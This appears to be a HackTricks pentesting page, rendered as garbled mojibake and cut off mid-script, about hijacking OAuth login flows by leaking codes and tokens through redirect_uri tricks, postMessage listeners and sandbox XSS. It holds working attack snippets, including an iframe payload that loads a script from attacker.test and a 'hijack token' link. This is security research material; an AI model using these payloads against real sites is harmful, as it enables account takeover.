# OAuth - Happy Paths, XSS, Iframes & Post Messages to leak code & state values

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTricksçš„è¡£ç‰©**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)ï¼Œæˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

**æ­¤å†…å®¹æ‘˜è‡ª**[**https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url**](https://labs.detectify.com/2022/07/06/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/#gadget-2-xss-on-sandbox-third-party-domain-that-gets-the-url)****

## ä¸åŒOAuthæµç¨‹çš„è§£é‡Š

### å“åº”ç±»å‹

é¦–å…ˆï¼ŒOAuthæµç¨‹ä¸­å¯ä»¥ä½¿ç”¨ä¸åŒçš„å“åº”ç±»å‹ã€‚è¿™äº›å“åº”ç±»å‹æˆäºˆ**ä»¤ç‰Œä»¥ç™»å½•ç”¨æˆ·æˆ–è·å–æ‰€éœ€ä¿¡æ¯**ã€‚

æœ€å¸¸è§çš„ä¸‰ç§ç±»å‹æ˜¯ï¼š

1. **`code` + `state`**ã€‚**`code`**ç”¨äº**è°ƒç”¨OAuthæä¾›è€…**çš„æœåŠ¡å™¨ä»¥è·å–ä»¤ç‰Œã€‚**`state`**å‚æ•°ç”¨äºéªŒè¯**å‘èµ·è°ƒç”¨çš„æ­£ç¡®ç”¨æˆ·**ã€‚åœ¨è¿›è¡ŒæœåŠ¡å™¨ç«¯è°ƒç”¨OAuthæä¾›è€…ä¹‹å‰ï¼ŒOAuthå®¢æˆ·ç«¯æœ‰è´£ä»»éªŒè¯çŠ¶æ€å‚æ•°ã€‚
2. **`id_token`**ã€‚æ˜¯ä½¿ç”¨OAuthæä¾›è€…çš„å…¬å…±è¯ä¹¦ç­¾åçš„JSON Web Tokenï¼ˆJWTï¼‰ï¼Œç”¨äºéªŒè¯æ‰€æä¾›çš„èº«ä»½æ˜¯å¦ç¡®å®å±äºå®ƒæ‰€å£°ç§°çš„èº«ä»½ã€‚
3. **`token`**ã€‚æ˜¯æœåŠ¡æä¾›å•†APIä¸­ä½¿ç”¨çš„**è®¿é—®ä»¤ç‰Œ**ã€‚

### å“åº”æ¨¡å¼

åœ¨OAuthæµç¨‹ä¸­ï¼Œæˆæƒæµç¨‹å¯ä»¥ä½¿ç”¨ä¸åŒçš„æ¨¡å¼å°†ä»£ç æˆ–ä»¤ç‰Œæä¾›ç»™ç½‘ç«™ï¼Œä»¥ä¸‹æ˜¯æœ€å¸¸è§çš„å››ç§æ¨¡å¼ä¹‹ä¸€ï¼š

1. **æŸ¥è¯¢**ã€‚å°†æŸ¥è¯¢å‚æ•°ä½œä¸ºé‡å®šå‘è¿”å›åˆ°ç½‘ç«™ï¼ˆ`https://example.com/callback?code=xxx&state=xxx`ï¼‰ã€‚ç”¨äº`code+state`ã€‚**`code`**åªèƒ½**ä½¿ç”¨ä¸€æ¬¡**ï¼Œåœ¨ä½¿ç”¨ä»£ç æ—¶éœ€è¦**OAuthå®¢æˆ·ç«¯å¯†é’¥**æ¥**è·å–è®¿é—®ä»¤ç‰Œ**ã€‚&#x20;
1. [æ­¤æ¨¡å¼ä¸æ¨èç”¨äºä»¤ç‰Œ](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#id\_token)ï¼Œå› ä¸º**ä»¤ç‰Œå¯ä»¥å¤šæ¬¡ä½¿ç”¨ï¼Œä¸åº”å‡ºç°åœ¨æœåŠ¡å™¨æ—¥å¿—æˆ–ç±»ä¼¼ä½ç½®**ã€‚å¤§å¤šæ•°OAuthæä¾›è€…ä¸æ”¯æŒæ­¤æ¨¡å¼ç”¨äºä»¤ç‰Œï¼Œä»…ç”¨äºä»£ç ã€‚ç¤ºä¾‹ï¼š
* `response_mode=query`ç”±Appleä½¿ç”¨ã€‚
* `response_type=code`ç”±Googleæˆ–Facebookä½¿ç”¨ã€‚
2. **ç‰‡æ®µ**ã€‚ä½¿ç”¨**ç‰‡æ®µé‡å®šå‘**ï¼ˆ`https://example.com/callback#access_token=xxx`ï¼‰ã€‚åœ¨æ­¤æ¨¡å¼ä¸‹ï¼ŒURLçš„ç‰‡æ®µéƒ¨åˆ†ä¸ä¼šå‡ºç°åœ¨ä»»ä½•æœåŠ¡å™¨æ—¥å¿—ä¸­ï¼Œå¹¶ä¸”åªèƒ½ä½¿ç”¨JavaScriptåœ¨å®¢æˆ·ç«¯ç«¯è®¿é—®ã€‚æ­¤å“åº”æ¨¡å¼ç”¨äºä»¤ç‰Œã€‚ç¤ºä¾‹ï¼š
* `response_mode=fragment`ç”±Appleå’ŒMicrosoftä½¿ç”¨ã€‚
* `response_type`åŒ…å«`id_token`æˆ–`token`ï¼Œç”±Googleã€Facebookã€Atlassianç­‰ä½¿ç”¨ã€‚
3. **Webæ¶ˆæ¯**ã€‚ä½¿ç”¨**postMessageåˆ°ç½‘ç«™çš„å›ºå®šæ¥æº**ï¼š\
`postMessage('{"access_token":"xxx"}','https://example.com')`\
å¦‚æœæ”¯æŒï¼Œé€šå¸¸å¯ä»¥ç”¨äºæ‰€æœ‰ä¸åŒçš„å“åº”ç±»å‹ã€‚ç¤ºä¾‹ï¼š
* `response_mode=web_message`ç”±Appleä½¿ç”¨ã€‚
* `redirect_uri=storagerelay://...`ç”±Googleä½¿ç”¨ã€‚
* `redirect_uri=https://staticxx.facebook.com/.../connect/xd_arbiter/...`ç”±Facebookä½¿ç”¨ã€‚
4. **è¡¨å•æäº¤**ã€‚ä½¿ç”¨è¡¨å•æäº¤åˆ°æœ‰æ•ˆçš„`redirect_uri`ï¼Œå°†**å¸¸è§„POSTè¯·æ±‚å‘é€å›ç½‘ç«™**ã€‚è¿™å¯ç”¨äºä»£ç å’Œä»¤ç‰Œã€‚ç¤ºä¾‹ï¼š
* `response_mode=form_post`ç”±Appleä½¿ç”¨ã€‚
* `ux_mode=redirect&login_uri=https://example.com/callback`ç”±Google Sign-In (GSI)ä½¿ç”¨ã€‚

## æ•…æ„ç ´å`state` <a href="#break-state-intentionally" id="break-state-intentionally"></a>

OAuthè§„èŒƒå»ºè®®åœ¨`response_type=code`çš„æƒ…å†µä¸‹ä½¿ç”¨`state`å‚æ•°ï¼Œä»¥ç¡®ä¿å‘èµ·æµç¨‹çš„ç”¨æˆ·ä¹Ÿæ˜¯åœ¨OAuthæµç¨‹ä¹‹åä½¿ç”¨ä»£ç å‘å‡ºä»¤ç‰Œçš„ç”¨æˆ·ã€‚

ç„¶è€Œï¼Œå¦‚æœ**`state`å€¼æ— æ•ˆ**ï¼Œ**`code`å°†ä¸ä¼šè¢«ä½¿ç”¨**ï¼Œå› ä¸ºéªŒè¯çŠ¶æ€æ˜¯ç½‘ç«™çš„è´£ä»»ï¼ˆæœ€ç»ˆçš„è´£ä»»ï¼‰ã€‚è¿™æ„å‘³ç€ï¼Œå¦‚æœæ”»å‡»è€…å¯ä»¥å‘å—å®³è€…å‘é€å¸¦æœ‰æ”»å‡»è€…æœ‰æ•ˆ`state`çš„ç™»å½•æµç¨‹é“¾æ¥ï¼ŒOAuthæµç¨‹å°†å¯¹å—å®³è€…å¤±è´¥ï¼Œå¹¶ä¸”`code`å°†æ°¸è¿œä¸ä¼šè¢«å‘é€åˆ°OAuthæä¾›è€…ã€‚å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿè·å–`code`ï¼Œä»ç„¶å¯ä»¥ä½¿ç”¨è¯¥`code`ã€‚

1. æ”»å‡»è€…ä½¿ç”¨â€œä½¿ç”¨Xç™»å½•â€åœ¨ç½‘ç«™ä¸Šå¯åŠ¨ç™»å½•æµç¨‹ã€‚
2. æ”»å‡»è€…ä½¿ç”¨`state`å€¼æ„é€ ä¸€ä¸ªé“¾æ¥ï¼Œä¾›å—å®³è€…ä½¿ç”¨OAuthæä¾›è€…è¿›è¡Œç™»å½•ï¼Œä½†ä½¿ç”¨æ”»å‡»è€…çš„`state`ã€‚
3. å—å®³è€…ä½¿ç”¨é“¾æ¥ç™»å½•å¹¶é‡å®šå‘å›ç½‘ç«™ã€‚
4. ç½‘ç«™éªŒè¯å—å®³è€…çš„`state`å¹¶åœæ­¢å¤„ç†ç™»å½•æµç¨‹ï¼Œå› ä¸ºå®ƒä¸æ˜¯æœ‰æ•ˆçš„çŠ¶æ€ã€‚å—å®³è€…çœ‹åˆ°é”™è¯¯é¡µé¢ã€‚
5. æ”»å‡»è€…æ‰¾åˆ°ä¸€ç§æ–¹æ³•ä»é”™è¯¯é¡µé¢æ³„éœ²`code`ã€‚
6. æ”»å‡»è€…ç°åœ¨å¯ä»¥ä½¿ç”¨è‡ªå·±çš„`state`å’Œä»å—å®³è€…é‚£é‡Œæ³„éœ²çš„`code`è¿›è¡Œç™»å½•ã€‚
### å“åº”ç±»å‹/å“åº”æ¨¡å¼åˆ‡æ¢

æ”¹å˜OAuthæµç¨‹çš„å“åº”ç±»å‹æˆ–å“åº”æ¨¡å¼å°†å½±å“ä»£ç æˆ–ä»¤ç‰Œè¿”å›åˆ°ç½‘ç«™çš„æ–¹å¼ï¼Œè¿™å¾€å¾€ä¼šå¯¼è‡´æ„å¤–è¡Œä¸ºã€‚æˆ‘è¿˜æ²¡æœ‰çœ‹åˆ°ä»»ä½•OAuthæä¾›è€…æœ‰é™åˆ¶ç½‘ç«™æ”¯æŒçš„å“åº”ç±»å‹æˆ–æ¨¡å¼çš„é€‰é¡¹ï¼Œå› æ­¤æ ¹æ®OAuthæä¾›è€…çš„ä¸åŒï¼Œé€šå¸¸è‡³å°‘æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šå¯ä»¥æ›´æ”¹çš„é€‰é¡¹ï¼Œä»¥ä¾¿å°è¯•è¿›å…¥éæ­£å¸¸è·¯å¾„ã€‚

è¿˜å¯ä»¥è¯·æ±‚å¤šä¸ªå“åº”ç±»å‹ã€‚æœ‰ä¸€ä»½è§„èŒƒè§£é‡Šäº†åœ¨è¯·æ±‚å¤šä¸ªå“åº”ç±»å‹æ—¶å¦‚ä½•æä¾›å€¼ç»™é‡å®šå‘URIï¼ˆ[https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#Encoding](https://openid.net/specs/oauth-v2-multiple-response-types-1\_0-09.html#Encoding)ï¼‰ï¼š

> å¦‚æœè¯·æ±‚ä¸­çš„`response_type`åªåŒ…å«éœ€è¦æœåŠ¡å™¨åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­å®Œå…¨ç¼–ç è¿”å›æ•°æ®çš„å€¼ï¼Œåˆ™æ­¤å¤šå€¼`response_type`çš„å“åº”ä¸­è¿”å›çš„æ•°æ®å¿…é¡»å®Œå…¨ç¼–ç åœ¨æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚æ­¤å»ºè®®é€‚ç”¨äºæˆåŠŸå’Œé”™è¯¯å“åº”ã€‚
>
> å¦‚æœè¯·æ±‚ä¸­çš„`response_type`åŒ…å«ä»»ä½•éœ€è¦æœåŠ¡å™¨åœ¨ç‰‡æ®µä¸­å®Œå…¨ç¼–ç è¿”å›æ•°æ®çš„å€¼ï¼Œåˆ™æ­¤å¤šå€¼`response_type`çš„å“åº”ä¸­è¿”å›çš„æ•°æ®å¿…é¡»å®Œå…¨ç¼–ç åœ¨ç‰‡æ®µä¸­ã€‚æ­¤å»ºè®®é€‚ç”¨äºæˆåŠŸå’Œé”™è¯¯å“åº”ã€‚

å¦‚æœæŒ‰ç…§è¿™ä¸ªè§„èŒƒæ­£ç¡®æ“ä½œï¼Œè¿™æ„å‘³ç€æ‚¨å¯ä»¥è¦æ±‚å°†`code`å‚æ•°å‘é€åˆ°ç½‘ç«™ï¼Œä½†æ˜¯å¦‚æœåŒæ—¶è¦æ±‚`id_token`ï¼Œåˆ™`code`å‚æ•°å°†å‘é€åˆ°ç‰‡æ®µéƒ¨åˆ†è€Œä¸æ˜¯æŸ¥è¯¢å­—ç¬¦ä¸²ä¸­ã€‚

å¯¹äºGoogleçš„ç™»å½•ï¼Œè¿™æ„å‘³ç€ï¼š
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
å°†é‡å®šå‘åˆ° `https://example.com/callback?code=xxx&state=yyy`ã€‚ä½†æ˜¯ï¼š
```
https://accounts.google.com/o/oauth2/v2/auth/oauthchooseaccount?
client_id=client-id.apps.googleusercontent.com&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback&
scope=openid%20email%20profile&
response_type=code,id_token&
access_type=offline&
state=yyy&
prompt=consent&flowName=GeneralOAuthFlow
```
å°†é‡å®šå‘åˆ° `https://example.com/callback#code=xxx&state=yyy&id_token=zzz`ã€‚

å¦‚æœä½¿ç”¨Appleï¼ŒåŒæ ·çš„æ€è·¯é€‚ç”¨ï¼š
```
https://appleid.apple.com/auth/authorize?
response_type=code&
response_mode=query&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
ä½ å°†è¢«é‡å®šå‘åˆ° `https://example.com/callback?code=xxx&state=yyy`ï¼Œä½†æ˜¯ï¼š
```
https://appleid.apple.com/auth/authorize?
response_type=code+id_token&
response_mode=fragment&
scope=&
state=zzz&
client_id=client-id&
redirect_uri=https%3A%2F%2Fexample.com%2Fcallback
```
å°†é‡å®šå‘åˆ°`https://example.com/callback#code=xxx&state=yyy&id_token=zzz`ã€‚

## éæ­£å¸¸è·¯å¾„

ç ”ç©¶çš„ä½œè€…ç§°ä¹‹ä¸º**éæ­£å¸¸è·¯å¾„ï¼Œå³ç”¨æˆ·é€šè¿‡OAuthç™»å½•åè¢«é‡å®šå‘åˆ°é”™è¯¯çš„URL**ã€‚è¿™å¾ˆæœ‰ç”¨ï¼Œå› ä¸ºå¦‚æœå®¢æˆ·ç«¯æä¾›äº†æœ‰æ•ˆçš„çŠ¶æ€+ä»£ç ä»¤ç‰Œ**ä½†æœªè¾¾åˆ°é¢„æœŸçš„é¡µé¢**ï¼Œé‚£ä¹ˆ**ä¿¡æ¯å°†æ— æ³•æ­£ç¡®æ¶ˆè€—**ï¼Œå¦‚æœæ”»å‡»è€…æ‰¾åˆ°ä¸€ç§æ–¹æ³•ä»â€œéæ­£å¸¸è·¯å¾„â€ä¸­**æ³„éœ²è¯¥ä¿¡æ¯**ï¼Œä»–å°†èƒ½å¤Ÿ**æ¥ç®¡è´¦æˆ·**ã€‚

é»˜è®¤æƒ…å†µä¸‹ï¼ŒOAuthæµç¨‹å°†è¾¾åˆ°é¢„æœŸçš„è·¯å¾„ï¼Œä½†æ˜¯å¯èƒ½å­˜åœ¨ä¸€äº›æ½œåœ¨çš„**é…ç½®é”™è¯¯**ï¼Œå…è®¸æ”»å‡»è€…**æ„é€ ç‰¹å®šçš„åˆå§‹OAuthè¯·æ±‚**ï¼Œä½¿ç”¨æˆ·åœ¨ç™»å½•ååˆ°è¾¾éæ­£å¸¸è·¯å¾„ã€‚

### é‡å®šå‘URIä¸åŒ¹é…

è¿™äº›â€œå¸¸è§â€çš„**é…ç½®é”™è¯¯**åœ¨OAuthé€šä¿¡çš„**é‡å®šå‘URL**ä¸­å‘ç°ã€‚

[**è§„èŒƒ**](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics-19#section-2.1) ****ä¸¥æ ¼æŒ‡å‡ºï¼Œé‡å®šå‘URLåº”ä¸å®šä¹‰çš„URLä¸¥æ ¼æ¯”è¾ƒï¼Œä¸å…è®¸é™¤ç«¯å£å¤–çš„ä»»ä½•æ›´æ”¹ã€‚ç„¶è€Œï¼Œä¸€äº›ç«¯ç‚¹å…è®¸è¿›è¡Œä¸€äº›ä¿®æ”¹ï¼š

### é‡å®šå‘URIè·¯å¾„é™„åŠ 

ä¸€äº›OAuthæä¾›å•†å…è®¸åœ¨`redirect_uri`è·¯å¾„ä¸­æ·»åŠ å…¶ä»–æ•°æ®ã€‚è¿™ä¹Ÿè¿åäº†è§„èŒƒï¼Œå°±åƒâ€œé‡å®šå‘URIå¤§å°å†™è½¬æ¢â€ä¸€æ ·ã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨`https://example.com/callback`é‡å®šå‘URIï¼Œå‘é€ï¼š
```
response_type=id_token&
redirect_uri=https://example.com/callbackxxx
```
æœ€ç»ˆä¼šé‡å®šå‘åˆ° `https://example.com/callbackxxx#id_token`ã€‚

### é‡å®šå‘URIå‚æ•°è¿½åŠ 

ä¸€äº›OAuthæä¾›å•†**å…è®¸æ·»åŠ é¢å¤–çš„æŸ¥è¯¢æˆ–ç‰‡æ®µå‚æ•°**åˆ°`redirect_uri`ä¸­ã€‚æ‚¨å¯ä»¥é€šè¿‡æä¾›ä¸URLè¿½åŠ çš„ç›¸åŒå‚æ•°æ¥è§¦å‘éæ­£å¸¸è·¯å¾„ã€‚ä¾‹å¦‚ï¼Œæœ‰ä¸€ä¸ª`https://example.com/callback`é‡å®šå‘URIï¼Œå‘é€ä»¥ä¸‹å†…å®¹ï¼š
```
response_type=code&
redirect_uri=https://example.com/callback%3fcode=xxx%26
```
ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œå°†é‡å®šå‘åˆ° `https://example.com/callback?code=xxx&code=real-code`ã€‚æ ¹æ®æ¥æ”¶åˆ°çš„å¤šä¸ªå…·æœ‰ç›¸åŒåç§°çš„å‚æ•°çš„ç½‘ç«™ï¼Œè¿™å¯èƒ½ä¼šè§¦å‘éæ­£å¸¸è·¯å¾„ã€‚å¯¹äº `token` å’Œ `id_token` ä¹Ÿæ˜¯å¦‚æ­¤ï¼š
```
response_type=code&
redirect_uri=https://example.com/callback%23id_token=xxx%26
```
### é‡å®šå‘URIçš„å‰©ä½™éƒ¨åˆ†æˆ–é…ç½®é”™è¯¯

å½“æ”¶é›†åŒ…å«`redirect_uri`å€¼çš„æ‰€æœ‰ç™»å½•URLæ—¶ï¼Œæˆ‘è¿˜å¯ä»¥æµ‹è¯•å…¶ä»–é‡å®šå‘URIå€¼æ˜¯å¦ä¹Ÿæœ‰æ•ˆã€‚åœ¨æˆ‘æµ‹è¯•çš„ç½‘ç«™ä¸­ä¿å­˜çš„125ä¸ªä¸åŒçš„Googleç™»å½•æµç¨‹ä¸­ï¼Œæœ‰5ä¸ªç½‘ç«™çš„èµ·å§‹é¡µé¢ä¹Ÿæ˜¯æœ‰æ•ˆçš„`redirect_uri`ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæ­£åœ¨ä½¿ç”¨`redirect_uri=https://auth.example.com/callback`ï¼Œåœ¨è¿™5ç§æƒ…å†µä¸‹ï¼Œä»»ä½•ä»¥ä¸‹éƒ½æ˜¯æœ‰æ•ˆçš„ï¼š

* `redirect_uri=https://example.com/`
* `redirect_uri=https://example.com`
* `redirect_uri=https://www.example.com/`
* `redirect_uri=https://www.example.com`

å¯¹äºå®é™…ä½¿ç”¨`id_token`æˆ–`token`çš„ç½‘ç«™æ¥è¯´ï¼Œè¿™å°¤å…¶æœ‰è¶£ï¼Œå› ä¸º`response_type=code`ä»ç„¶ä¼šåœ¨OAuthæµç¨‹çš„æœ€åä¸€æ­¥ä¸­ï¼Œå³è·å–ä»¤ç‰Œæ—¶ï¼Œç”±OAuthæä¾›å•†éªŒè¯`redirect_uri`ã€‚

## Gadget 1ï¼šå¼±æˆ–æ²¡æœ‰è¿›è¡Œæ¥æºæ£€æŸ¥çš„postMessageç›‘å¬å™¨æ³„éœ²URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-1-1024x582.png)

**åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæœ€ç»ˆçš„éæ­£å¸¸è·¯å¾„æ˜¯å‘é€ä¸€ä¸ªpostè¯·æ±‚æ¶ˆæ¯ï¼Œæ³„éœ²äº†location.hrefã€‚**\
ä¸€ä¸ªä¾‹å­æ˜¯åŠ è½½åœ¨ç½‘ç«™ä¸Šçš„ä¸€ä¸ªæµè¡Œç½‘ç«™çš„åˆ†æSDKï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example1.png)

è¯¥SDKæš´éœ²äº†ä¸€ä¸ªpostMessageç›‘å¬å™¨ï¼Œå½“æ¶ˆæ¯ç±»å‹åŒ¹é…æ—¶ï¼Œä¼šå‘é€ä»¥ä¸‹æ¶ˆæ¯ï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example2.png)

ä»ä¸åŒçš„æ¥æºå‘å…¶å‘é€æ¶ˆæ¯ï¼š
```javascript
openedwindow = window.open('https://www.example.com');
...
openedwindow.postMessage('{"type":"sdk-load-embed"}','*');
```
ä¸€ä¸ªå“åº”æ¶ˆæ¯å°†æ˜¾ç¤ºåœ¨å‘é€æ¶ˆæ¯çš„çª—å£ä¸­ï¼Œè¯¥æ¶ˆæ¯åŒ…å«ç½‘ç«™çš„`location.href`ï¼š

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget1-example3.png)

æ”»å‡»ä¸­ä½¿ç”¨çš„æµç¨‹å–å†³äºä»£ç å’Œä»¤ç‰Œåœ¨ç™»å½•æµç¨‹ä¸­çš„ä½¿ç”¨æ–¹å¼ï¼Œä½†æ€è·¯æ˜¯ï¼š

### **æ”»å‡»**

1. æ”»å‡»è€…å‘å—å®³è€…å‘é€ä¸€ä¸ªç»è¿‡ç²¾å¿ƒå‡†å¤‡çš„é“¾æ¥ï¼Œè¯¥é“¾æ¥å·²å‡†å¤‡å¥½åœ¨OAuthæµç¨‹ä¸­å¯¼è‡´éæ­£å¸¸è·¯å¾„ã€‚
2. å—å®³è€…**ç‚¹å‡»**è¯¥é“¾æ¥ã€‚æ–°æ ‡ç­¾é¡µæ‰“å¼€ï¼Œæ˜¾ç¤ºæ­£åœ¨åˆ©ç”¨çš„ç½‘ç«™çš„OAuthæä¾›ç¨‹åºä¹‹ä¸€çš„**ç™»å½•**æµç¨‹ã€‚
3. åœ¨è¢«åˆ©ç”¨çš„ç½‘ç«™ä¸Šè§¦å‘éæ­£å¸¸è·¯å¾„ï¼Œ**æ˜“å—æ”»å‡»çš„postMessageç›‘å¬å™¨åœ¨å—å®³è€…æ‰€åœ¨çš„é¡µé¢ä¸ŠåŠ è½½ï¼Œä»ç„¶å¸¦æœ‰URLä¸­çš„ä»£ç æˆ–ä»¤ç‰Œ**ã€‚
4. ç”±æ”»å‡»è€…å‘é€çš„**åŸå§‹æ ‡ç­¾é¡µ**å‘æ–°æ ‡ç­¾é¡µå‘é€ä¸€ç³»åˆ—**postMessage**ï¼Œä»¥ä½¿postMessageç›‘å¬å™¨æ³„æ¼å½“å‰URLã€‚
5. ç”±æ”»å‡»è€…å‘é€çš„åŸå§‹æ ‡ç­¾é¡µç„¶å**ç›‘å¬å‘é€ç»™å®ƒçš„æ¶ˆæ¯**ã€‚å½“URLä»¥æ¶ˆæ¯å½¢å¼è¿”å›æ—¶ï¼Œ**æå–ä»£ç å’Œä»¤ç‰Œ**å¹¶å‘é€ç»™æ”»å‡»è€…ã€‚
6. æ”»å‡»è€…ä½¿ç”¨åœ¨éæ­£å¸¸è·¯å¾„ä¸Šç»“æŸçš„ä»£ç æˆ–ä»¤ç‰Œ**ä»¥å—å®³è€…èº«ä»½ç™»å½•**ã€‚

## Gadget 2ï¼šåœ¨æ²™ç›’/ç¬¬ä¸‰æ–¹åŸŸä¸Šçš„XSSè·å–URL

![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget-2-1024x582.png)

&#x20;

## **Gadget 2ï¼šç¤ºä¾‹1ï¼Œä»æ²™ç›’iframeä¸­çªƒå–window.name**

è¿™ä¸ªç¤ºä¾‹åœ¨**OAuthæµç¨‹ç»“æŸçš„é¡µé¢**ä¸ŠåŠ è½½äº†ä¸€ä¸ª**iframe**ã€‚**iframe**çš„**åç§°**æ˜¯`window.location`å¯¹è±¡çš„**JSONå­—ç¬¦ä¸²åŒ–ç‰ˆæœ¬**ã€‚è¿™æ˜¯ä¸€ç§æ—§çš„è·¨åŸŸä¼ è¾“æ•°æ®çš„æ–¹å¼ï¼Œå› ä¸ºiframeä¸­çš„é¡µé¢å¯ä»¥é€šè¿‡çˆ¶é¡µé¢è®¾ç½®è‡ªå·±çš„`window.name`ï¼š
```javascript
i = document.createElement('iframe');
i.name = JSON.stringify(window.location)
i.srcdoc = '<script>console.log("my name is: " + window.name)</script>';
document.body.appendChild(i)
```
![](https://labs.detectify.com/wp-content/uploads/2022/06/gadget2-example2.png)

åœ¨**iframeä¸­åŠ è½½çš„åŸŸ**ä¹Ÿå­˜åœ¨ä¸€ä¸ªç®€å•çš„XSSæ¼æ´ï¼š
```
https://examplesandbox.com/embed_iframe?src=javascript:alert(1)
```
### æ”»å‡»

å¦‚æœåœ¨ä¸€ä¸ªçª—å£ä¸­çš„ä¸€ä¸ª**åŸŸ**ä¸Šæœ‰ä¸€ä¸ª**XSS**ï¼Œé‚£ä¹ˆå¦‚æœè¿™äº›çª—å£ä¹‹é—´å­˜åœ¨çˆ¶/å­/opener-**å…³ç³»**ï¼Œé‚£ä¹ˆè¿™ä¸ªçª—å£å°±å¯ä»¥**è®¿é—®ç›¸åŒæºçš„å…¶ä»–çª—å£**ã€‚

è¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥åˆ©ç”¨XSSæ¥åŠ è½½ä¸€ä¸ªå¸¦æœ‰ç‰¹åˆ¶**OAuthé“¾æ¥**çš„æ–°æ ‡ç­¾é¡µï¼Œè¯¥é“¾æ¥å°†ä»¥**åŠ è½½å¸¦æœ‰ä»¤ç‰Œçš„iframeçš„è·¯å¾„**ç»“æŸã€‚ç„¶åï¼Œä»è¢«åˆ©ç”¨çš„**XSS**é¡µé¢ä¸Šï¼Œå¯ä»¥**è¯»å–iframeçš„åç§°**ï¼Œå› ä¸ºå®ƒåœ¨iframeçš„çˆ¶é¡µé¢ä¸Šæœ‰ä¸€ä¸ª**opener**ï¼Œå¹¶å°†å…¶æ³„éœ²å‡ºå»ã€‚

æ›´å…·ä½“åœ°è¯´ï¼š

1. åˆ›å»ºä¸€ä¸ªæ¶æ„é¡µé¢ï¼Œå…¶ä¸­åµŒå…¥äº†ä¸€ä¸ªå¸¦æœ‰XSSçš„æ²™ç›’çš„iframeï¼ŒåŠ è½½äº†æˆ‘çš„è‡ªå®šä¹‰è„šæœ¬ï¼š

```html
<div id="leak"><iframe src="https://examplesandbox.com/embed_iframe?src=javascript:
x=createElement('script'),
x.src='//attacker.test/inject.js',
document.body.appendChild(x);"
style="border:0;width:500px;height:500px"></iframe></div>
```

2. åœ¨æˆ‘åŠ è½½åˆ°æ²™ç›’ä¸­çš„è„šæœ¬ä¸­ï¼Œæˆ‘ç”¨è¦ç”¨äºå—å®³è€…çš„é“¾æ¥æ›¿æ¢äº†å†…å®¹ï¼š

```javascript
document.body.innerHTML =
'<a href="#" onclick="
b=window.open("https://accounts.google.com/o/oauth2/auth/oauthchooseaccount?...");">
Click here to hijack token</a>';
```

æˆ‘è¿˜å¯åŠ¨äº†ä¸€ä¸ªå®šæ—¶å™¨è„šæœ¬ï¼Œä»¥æ£€æŸ¥é“¾æ¥æ˜¯å¦å·²æ‰“å¼€ï¼Œå¹¶ä¸”æˆ‘æƒ³è¦è®¿é—®çš„iframeæ˜¯å¦å­˜åœ¨ï¼Œä»¥è·å–ä¸æ”»å‡»è€…é¡µé¢ä¸Šçš„iframeå…·æœ‰ç›¸åŒæºçš„iframeä¸Šè®¾ç½®çš„`window.name`ï¼š

```javascript
x = setInterval(function() {
if(parent.window.b &&
parent.window.b.frames[0] &&
